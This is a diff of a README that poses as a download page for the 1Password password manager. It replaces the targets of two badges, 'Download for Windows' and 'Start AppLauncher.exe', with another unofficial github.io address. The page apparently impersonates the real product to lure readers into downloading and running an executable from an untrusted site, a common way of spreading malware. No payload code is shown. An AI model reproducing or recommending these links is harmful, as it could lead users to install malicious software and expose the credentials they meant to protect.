@@ -2,8 +2,8 @@
 
 Protect your digital life with 1Password — a secure and intelligent password manager designed for both individuals and teams. Store credentials, payment details, and sensitive notes in an encrypted vault with zero-knowledge architecture.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://minessrewacs9123web0.github.io/.github/)
-[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=verizon)](https://minessrewacs9123web0.github.io/.github/)
+[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://rev1password4pcinf0.github.io/.github/)
+[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=verizon)](https://rev1password4pcinf0.github.io/.github/)
 
 ---
 
